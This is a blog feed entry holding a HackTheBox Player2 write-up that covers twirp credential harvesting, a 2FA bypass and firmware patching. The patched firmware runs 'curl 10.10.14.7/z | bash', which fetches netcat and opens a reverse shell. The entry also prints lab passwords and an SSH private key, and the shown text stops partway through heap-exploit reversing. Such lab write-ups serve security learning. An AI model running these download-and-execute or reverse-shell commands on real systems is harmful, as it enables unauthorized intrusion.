// API callback
random_posts({"version":"1.0","encoding":"UTF-8","feed":{"xmlns":"http://www.w3.org/2005/Atom","xmlns$openSearch":"http://a9.com/-/spec/opensearchrss/1.0/","xmlns$blogger":"http://schemas.google.com/blogger/2008","xmlns$georss":"http://www.georss.org/georss","xmlns$gd":"http://schemas.google.com/g/2005","xmlns$thr":"http://purl.org/syndication/thread/1.0","id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982"},"updated":{"$t":"2021-11-30T16:35:33.972-08:00"},"title":{"type":"text","$t":"Will's Root"},"subtitle":{"type":"html","$t":"Pentesting, CTFs, and Writeups"},"link":[{"rel":"http://schemas.google.com/g/2005#feed","type":"application/atom+xml","href":"https:\/\/www.willsroot.io\/feeds\/posts\/default"},{"rel":"self","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=15\u0026max-results=1"},{"rel":"alternate","type":"text/html","href":"https:\/\/www.willsroot.io\/"},{"rel":"hub","href":"http://pubsubhubbub.appspot.com/"},{"rel":"previous","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=14\u0026max-results=1"},{"rel":"next","type":"application/atom+xml","href":"https:\/\/www.blogger.com\/feeds\/8814147965526194982\/posts\/default?alt=json-in-script\u0026start-index=16\u0026max-results=1"}],"author":[{"name":{"$t":"Unknown"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"http://schemas.google.com/g/2005#thumbnail","width":"16","height":"16","src":"https:\/\/img1.blogblog.com\/img\/b16-rounded.gif"}}],"generator":{"version":"7.00","uri":"http://www.blogger.com","$t":"Blogger"},"openSearch$totalResults":{"$t":"54"},"openSearch$startIndex":{"$t":"15"},"openSearch$itemsPerPage":{"$t":"1"},"entry":[{"id":{"$t":"tag:blogger.com,1999:blog-8814147965526194982.post-6225937035947364111"},"published":{"$t":"2020-06-27T08:00:00.001-07:00"},"updated":{"$t":"2020-09-16T23:17:27.678-07:00"},"title":{"type":"text","$t":"Player2 HacktheBox Writeup"},"content":{"type":"html","$t":"\u003Cdiv class=\"separator\" style=\"clear: both; text-align: center;\"\u003E\u003Ca href=\"https:\/\/1.bp.blogspot.com\/-_DisSoD2thg\/XvYVn9_M2gI\/AAAAAAAABqU\/ceaEKxHBGAQ0W8ms2Ul6yXvfEcZRi7wLgCLcBGAsYHQ\/s1600\/player2.JPG\" style=\"margin-left: 1em; margin-right: 1em;\"\u003E\u003Cimg border=\"0\" data-original-height=\"120\" data-original-width=\"401\" height=\"118\" src=\"https:\/\/1.bp.blogspot.com\/-_DisSoD2thg\/XvYVn9_M2gI\/AAAAAAAABqU\/ceaEKxHBGAQ0W8ms2Ul6yXvfEcZRi7wLgCLcBGAsYHQ\/s400\/player2.JPG\" width=\"400\" \/\u003E\u003C\/a\u003E\u003C\/div\u003E\u003Cbr \/\u003EPlayer2 was a challenging but very fun box by MrR3boot and b14ckh34rt. The highlight of the box for me is the finale 2.29 heap pwn!\u0026nbsp; In my opinion, if there were no unintended routes, this would have been by far the hardest box so far, but some of these alternative solutions were never patched.\u003Cbr \/\u003E\u003Cbr \/\u003EOn the intial enum, we find on player2.htb a link to product.player2.htb regarding the Protobs product.\u0026nbsp; It's a login page, so it's time to hopefully find some creds.\u0026nbsp; On an initial nmap port scan, we also find the following ports: 22, 80, 8545.\u0026nbsp; Going to port 8545, we see an invalid twirp route message, giving away the fact that twirp is used on this box. While dirbing player2.htb, we also come across the proto directory.\u0026nbsp; Documentation at this point basically told me what to do:\u003Cbr \/\u003E\u003Cbr \/\u003E\u003Ca href=\"https:\/\/twitchtv.github.io\/twirp\/docs\/curl.html\"\u003Ehttps:\/\/twitchtv.github.io\/twirp\/docs\/curl.html\u003C\/a\u003E\u003Cbr \/\u003E\u003Ca href=\"https:\/\/github.com\/twitchtv\/twirp\/blob\/master\/docs\/routing.md\"\u003Ehttps:\/\/github.com\/twitchtv\/twirp\/blob\/master\/docs\/routing.md\u003C\/a\u003E\u003Cbr \/\u003E\u003Cbr \/\u003EFrom the proto directory, let's try to find some configuration info by fuzzing for the .proto file.\u0026nbsp; Using some different wordlists with wfuzz on \/proto\/FUZZ.proto, I came across generated.proto:\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003E\u003Cbr \/\u003Esyntax = \"proto3\";\u003Cbr \/\u003E\u003Cbr \/\u003Epackage twirp.player2.auth;\u003Cbr \/\u003Eoption go_package = \"auth\";\u003Cbr \/\u003E\u003Cbr \/\u003Eservice Auth {\u003Cbr \/\u003E\u0026nbsp; rpc GenCreds(Number) returns (Creds);\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003Cbr \/\u003Emessage Number {\u003Cbr \/\u003E\u0026nbsp; int32 count = 1; \/\/ must be \u0026gt; 0\u003Cbr \/\u003E}\u003Cbr \/\u003E\u003Cbr \/\u003Emessage Creds {\u003Cbr \/\u003E\u0026nbsp; int32 count = 1;\u003Cbr \/\u003E\u0026nbsp; string name = 2;\u003Cbr \/\u003E\u0026nbsp; string pass = 3;\u003Cbr \/\u003E}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003ENote how twirp documentation mentions the route as the following:\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EPOST \/twirp\/\u0026lt;package\u0026gt;.\u0026lt;Service\u0026gt;\/\u0026lt;Method\u0026gt;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EFrom the source above, the route will be twirp.player2.auth.Auth\/GenCreds... some nice credentials should come from here!\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EUsing the twirp documentation with curl, I played around and curled to the service route based on the format from the documentation.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Ecurl -X POST \"http:\/\/player2.htb:8545\/twirp\/twirp.player2.auth.Auth\/GenCreds\" --header \"Content-Type:application\/json\" --data '{}'\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EHowever, we end up getting a lot of different creds and most of them don't work.\u0026nbsp; I recieved the following:\u003C\/div\u003E\u003Cdiv\u003E{\"name\":\"snowscan\",\"pass\":\"Lp-+Q8umLW5*7qkc\"}\u003C\/div\u003E\u003Cdiv\u003E{\"name\":\"snowscan\",\"pass\":\"ze+EKe-SGF^5uZQX\"}\u003C\/div\u003E\u003Cdiv\u003E{\"name\":\"jkr\",\"pass\":\"tR@dQnwnZEk95*6#\"}\u003C\/div\u003E\u003Cdiv\u003E{\"name\":\"mprox\",\"pass\":\"ze+EKe-SGF^5uZQX\"}\u003C\/div\u003E\u003Cdiv\u003E{\"name\":\"jkr\",\"pass\":\"XHq7_WJTA?QD_?E2\"}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EWith some different varaitions, I determined that the following worked:\u003C\/div\u003E\u003Cdiv\u003Ejkr:Lp-+Q8umLW5*7qkc\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EHowever, once we login, it asks for OTP.\u0026nbsp; It tells us that we can either use the OTP that was sent to mobile or backup codes.\u0026nbsp; I did notice an initial api link from dirb originally.\u0026nbsp; This page is called totp, which is a type of otp.\u0026nbsp; Thinking logically, plugging in \/api\/totp actually worked.\u0026nbsp; It also mentioned backup codes.\u0026nbsp; Playing around, there seems to be “action” parameter on the api.\u0026nbsp; After a while, I figured out that sending in the logged in session id along with a request for “backup_codes” (a logical name for what we are looking for) gave us the TOTP.\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Ecurl -X POST \"http:\/\/product.player2.htb\/api\/totp\" --header \"Content-Type:application\/json\" -d '{\"action\":\"backup_codes\"}' --cookie \"PHPSESSID=06plq8egcf5e8eijvhs8abjs7q\"\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E{\"user\":\"jkr\",\"code\":\"29389234823423\"}\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EAfter rooting the box, \u003Ca href=\"https:\/\/twitter.com\/youreafed\" target=\"_blank\"\u003Ehevr\u003C\/a\u003E pointed out that there should be a type juggling attack here as the 2FA bypass:\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Ecurl -X POST \"http:\/\/product.player2.htb\/api\/totp\" --header \"Content-Type:application\/json\" -d '{\"action\":0}' --cookie \"PHPSESSID=06plq8egcf5e8eijvhs8abjs7q\"\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EInside the following page, we see a mention to a pdf and a link to a firmware download.\u0026nbsp; It mentions that the firmware is signed.\u0026nbsp; Extracting the binary file from the tar, I opened it up in a hex editor and saw the ELF header appear 64 bytes into the file.\u0026nbsp; It seems safe here to assume that the first 64 bytes is probably the signature.\u0026nbsp; Let's take out the first 64 bytes: dd if=Protobs.bin bs=64 skip=1 of=firmware.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EWhile reversing it, I noticed how the main function called another function, which in turn called system on a string.\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\u003Cdiv\u003E0x004013c9\u0026nbsp; \u0026nbsp; \u0026nbsp; 55\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;push rbp\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013ca\u0026nbsp; \u0026nbsp; \u0026nbsp; 4889e5\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;mov rbp, rsp\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013cd\u0026nbsp; \u0026nbsp; \u0026nbsp; 4883ec10\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;sub rsp, 0x10\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013d1\u0026nbsp; \u0026nbsp; \u0026nbsp; 64488b042528.\u0026nbsp; mov rax, qword fs:[0x28]\u0026nbsp; \u0026nbsp; ; [0x28:8]=-1 ; '(' ; 40\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013da\u0026nbsp; \u0026nbsp; \u0026nbsp; 488945f8\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;mov qword [local_8h], rax\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013de\u0026nbsp; \u0026nbsp; \u0026nbsp; 31c0\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;xor eax, eax\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013e0\u0026nbsp; \u0026nbsp; \u0026nbsp; 488d3dbd0c00.\u0026nbsp; lea rdi, qword str.stty_raw__echo_min_0_time_10 ; 0x4020a4 ;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\"stty raw -echo min 0 time 10\"\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013e7\u0026nbsp; \u0026nbsp; \u0026nbsp; e884fcffff\u0026nbsp; \u0026nbsp; \u0026nbsp;call sym.imp.system\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;; int system(const char *string)\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013ec\u0026nbsp; \u0026nbsp; \u0026nbsp; e8bffcffff\u0026nbsp; \u0026nbsp; \u0026nbsp;call sym.imp.getchar\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ; int getchar(void)\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013f1\u0026nbsp; \u0026nbsp; \u0026nbsp; 8945f4\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;mov dword [local_ch], eax\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;0x004013f4\u0026nbsp; \u0026nbsp; \u0026nbsp; 837df41b\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;cmp dword [local_ch], 0x1b\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;,=\u0026lt; 0x004013f8\u0026nbsp; \u0026nbsp; \u0026nbsp; 7416\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;je 0x401410\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;|\u0026nbsp; \u0026nbsp;0x004013fa\u0026nbsp; \u0026nbsp; \u0026nbsp; 488d3dc00c00.\u0026nbsp; lea rdi, qword str.stty_sane ; 0x4020c1 ; \"stty sane\"\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;|\u0026nbsp; \u0026nbsp;0x00401401\u0026nbsp; \u0026nbsp; \u0026nbsp; e86afcffff\u0026nbsp; \u0026nbsp; \u0026nbsp;call sym.imp.system\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;; int system(const char *string)\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;|\u0026nbsp; \u0026nbsp;0x00401406\u0026nbsp; \u0026nbsp; \u0026nbsp; bf00000000\u0026nbsp; \u0026nbsp; \u0026nbsp;mov edi, 0\u003C\/div\u003E\u003Cdiv\u003E|\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;|\u0026nbsp; \u0026nbsp;0x0040140b\u0026nbsp; \u0026nbsp; \u0026nbsp; e8c0fcffff\u0026nbsp; \u0026nbsp; \u0026nbsp;call sym.imp.exit\u003C\/div\u003E\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003EWe can patch binaries with dd to call system on a different string and then reattach the 64 byte signature:\u003C\/div\u003E\u003Cdiv\u003E\u003Ca href=\"https:\/\/unix.stackexchange.com\/questions\/214820\/patching-a-binary-with-dd\"\u003Ehttps:\/\/unix.stackexchange.com\/questions\/214820\/patching-a-binary-with-dd\u003C\/a\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EFirst, finding the offset to the first string with stty.\u003C\/div\u003E\u003Cdiv\u003Estrings -t d Protobs.bin | grep stty\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EThen, I created a “malicious” file for the next dd to transfer into and replace the string.\u0026nbsp; It contained the following contents:\u003C\/div\u003E\u003Cdiv\u003Ecurl 10.10.14.7\/z | bash\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EThe “z” on my side is just a shellscript containing the following:\u003C\/div\u003E\u003Cdiv\u003Ecurl http:\/\/10.10.14.7\/nc -o \/tmp\/nc\u003C\/div\u003E\u003Cdiv\u003Echmod +x \/tmp\/nc\u003C\/div\u003E\u003Cdiv\u003E\/tmp\/nc 10.10.14.7 1337 -e \/bin\/sh\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EThe reason I kept the original command so small was because I was being cautious about messing up the binary with a string that is too long.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EThen, lastly, with the final patching:\u003C\/div\u003E\u003Cdiv\u003Edd if=malicious of=Protobs.bin obs=1 seek=8420 conv=notrunc\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EUploading this should pop us a shell back as www-data.\u003C\/div\u003E\u003Cdiv\u003ELooking in \/etc\/passwd, there are two potential users to go for: egre55 and observer.\u0026nbsp; I also noticed that there is an account for the mosquitto service.\u0026nbsp; The service is also running on port 1883.\u0026nbsp; Reading around, the SYS-topic part of it was quite interesting.\u003C\/div\u003E\u003Cdiv\u003E\u003Ca href=\"https:\/\/blog.teserakt.io\/2019\/02\/25\/securing-the-mosquitto-mqtt-broker\/\"\u003Ehttps:\/\/blog.teserakt.io\/2019\/02\/25\/securing-the-mosquitto-mqtt-broker\/\u003C\/a\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003ETo quote the article, SYS topics are a special class of topics under which the broker publishes data, typically for monitoring purposes. SYS topics are not a formal standard but are an established practice in MQTT brokers.\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EGoing to it with the following command:\u003C\/div\u003E\u003Cdiv\u003Emosquitto_sub -h localhost -p 1883 -v -t '$SYS\/#'\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EWe end up seeing an SSH key getting dumped after a while:\u003C\/div\u003E\u003C\/div\u003E\u003Cbr \/\u003E\u003Cdiv class=\"code\"\u003E-----BEGIN RSA PRIVATE KEY-----\u003Cbr \/\u003EMIIEpAIBAAKCAQEA7Gc\/OjpFFvefFrbuO64wF8sNMy+\/7miymSZsEI+y4pQyEUBA\u003Cbr \/\u003ER0JyfLk8f0SoriYk0clR\/JmY+4mK0s7+FtPcmsvYgReiqmgESc\/brt3hDGBuVUr4\u003Cbr \/\u003Eet8twwy77KkjypPy4yB0ecQhXgtJNEcEFUj9DrOq70b3HKlfu4WzGwMpOsAAdeFT\u003Cbr \/\u003E+kXUsGy+Cp9rp3gS3qZ2UGUMsqcxCcKhn92azjFoZFMCP8g4bBXUgGp4CmFOtdvz\u003Cbr \/\u003ESM29st5P4Wqn0bHxupZ0ht8g30TJd7FNYRcQ7\/wGzjvJzVBywCxirkhPnv8sQmdE\u003Cbr \/\u003E+UAakPZsfw16u5dDbz9JElNbBTvwO9chpYIs0QIDAQABAoIBAA5uqzSB1C\/3xBWd\u003Cbr \/\u003E62NnWfZJ5i9mzd\/fMnAZIWXNcA1XIMte0c3H57dnk6LtbSLcn0jTcpbqRaWtmvUN\u003Cbr \/\u003EwANiwcgNg9U1vS+MFB7xeqbtUszvoizA2\/ScZW3P\/DURimbWq3BkTdgVOjhElh6D\u003Cbr \/\u003E62LlRtW78EaVXYa5bGfFXM7cXYsBibg1+HOLon3Lrq42j1qTJHH\/oDbZzAHTo6IO\u003Cbr \/\u003E91TvZVnms2fGYTdATIestpIRkfKr7lPkIAPsU7AeI5iAi1442Xv1NvGG5WPhNTFC\u003Cbr \/\u003Egw4R0V+96fOtYrqDaLiBeJTMRYp\/eqYHXg4wyF9ZEfRhFFOrbLUHtUIvkFI0Ya\/Y\u003Cbr \/\u003EQACn17UCgYEA\/eI6xY4GwKxV1CvghL+aYBmqpD84FPXLzyEoofxctQwcLyqc5k5f\u003Cbr \/\u003Ellga+8yZZyeWB\/rWmOLSmT\/41Z0j6an0bLPe0l9okX4j8WOSmO6TisD4WiFjdAos\u003Cbr \/\u003EJqiQej4Jch4fTJGegctyaOwsIVvP+hKRvYIwO9CKsaAgOQySlxQBOwMCgYEA7l+3\u003Cbr \/\u003EJloRxnCYYv+eO94sNJWAxAYrcPKP6nhFc2ReZEyrPxTezbbUlpAHf+gVJNVdetMt\u003Cbr \/\u003EioLhQPUNCb3mpaoP0mUtTmpmkcLbi3W25xXfgTiX8e6ZWUmw+6t2uknttjti97dP\u003Cbr \/\u003EQFwjZX6QPZu4ToNJczathY2+hREdxR5hR6WrJpsCgYEApmNIz0ZoiIepbHchGv8T\u003Cbr \/\u003Epp3Lpv9DuwDoBKSfo6HoBEOeiQ7ta0a8AKVXceTCOMfJ3Qr475PgH828QAtPiQj4\u003Cbr \/\u003EhvFPPCKJPqkj10TBw\/a\/vXUAjtlI+7ja\/K8GmQblW+P\/8UeSUVBLeBYoSeiJIkRf\u003Cbr \/\u003EPYsAH4NqEkV2OM1TmS3kLI8CgYBne7AD+0gKMOlG2Re1f88LCPg8oT0MrJDjxlDI\u003Cbr \/\u003ENoNv4YTaPtI21i9WKbLHyVYchnAtmS4FGqp1S6zcVM+jjb+OpBPWHgTnNIOg+Hpt\u003Cbr \/\u003EuaYs8AeupNl31LD7oMVLPDrxSLi\/N5o1I4rOTfKKfGa31vD1DoCoIQ\/brsGQyI6M\u003Cbr \/\u003EzxQNDwKBgQCBOLY8aLyv\/Hi0l1Ve8Fur5bLQ4BwimY3TsJTFFwU4IDFQY78AczkK\u003Cbr \/\u003E\/1i6dn3iKSmL75aVKgQ5pJHkPYiTWTRq2a\/y8g\/leCrvPDM19KB5Zr0Z1tCw5XCz\u003Cbr \/\u003EiZHQGq04r9PMTAFTmaQfMzDy1Hfo8kZ\/2y5+2+lC7wIlFMyYze8n8g==\u003Cbr \/\u003E-----END RSA PRIVATE KEY-----\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003ETesting it on the two possible users, it turned out that it works for observer.\u0026nbsp; And now user has been pwned!\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EFinally, we have hit the part for root.\u0026nbsp; It's a poison null byte on 2.29 (there also was an easier heap overflow unintended).\u0026nbsp; Anyways, make sure to read up on libc malloc.c for 2.29 on bminor's mirror of libc source before continuing!\u0026nbsp; The binary can be found in \/opt\/Configuration_Utility, and running checksec on it immediately informs us that it is patchelf'd to run ld and libc different from the box's libc and ld.\u0026nbsp; Personally, I like to use all of pwndbg's capabilities with libc debug symbols, so I ran the following commands to switch the interpreter and rpath to default and debugged on a headless ubuntu VM running the same libc version:\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Epatchelf Protobs --set-interpreter \/lib64\/ld-linux-x86-64.so.2\u003C\/div\u003E\u003Cdiv\u003Epatchelf Protobs --remove-rpath \/lib\/x86_64-linux-gnu\/\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003EAnyways, let us begin the pwning!\u0026nbsp; Here is the binary reversed with my comments.\u003C\/div\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv class=\"code\"\u003E\u003Cdiv\u003E\/\/only 15 indices\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Etypedef struct\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char[20] game;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int contrast;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int gamma;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int xres;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int yres;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int controller;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; unsigned int desc;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char *description;\u003C\/div\u003E\u003Cdiv\u003E}gamestruct;\u003C\/div\u003E\u003Cdiv\u003E\u003Cbr \/\u003E\u003C\/div\u003E\u003Cdiv\u003Evoid create(void)\u003C\/div\u003E\u003Cdiv\u003E{\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char *__dest;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long lVar1;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; int iVar2;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; undefined4 uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; void *pvVar4;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; ssize_t sVar5;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; size_t sVar6;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long in_FS_OFFSET;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; int local_448;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; char local_428 [19];\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; undefined local_415;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; long local_20;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp;\u0026nbsp;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; local_20 = *(long *)(in_FS_OFFSET + 0x28);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; iVar2 = FUN_00400c8b();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; if (iVar2 \u0026lt; 0) {\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; \u0026nbsp; FUN_00400c3e();\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; }\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; pvVar4 = malloc(0x38); \/\/so default, allocate to 0x40 tcachebin, note libc 2.29\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(void **)(\u0026amp;DAT_00603060 + (long)iVar2 * 8) = pvVar4;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; __dest = *(char **)(\u0026amp;DAT_00603060 + (long)iVar2 * 8);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; putchar(10);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; puts(\"==New Game Configuration\");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; printf(\" [ Game\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; fgets(local_428,0x400,stdin);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; readin(local_428);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; local_415 = 0;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; strncpy(__dest,local_428,0x14);\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Contrast\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 *)(__dest + 0x14) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Gamma\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp;]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 *)(__dest + 0x18) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Resolution X-Axis\u0026nbsp; \u0026nbsp;]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 *)(__dest + 0x1c) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Resolution Y-Axis\u0026nbsp; \u0026nbsp;]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 *)(__dest + 0x20) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Controller\u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; \u0026nbsp; ]: \");\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 *)(__dest + 0x24) = uVar3;\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; uVar3 = readnum(\" [ Size of Description ]: \"); \/\/not nulled out another bug here!\u003C\/div\u003E\u003Cdiv\u003E\u0026nbsp; *(undefined4 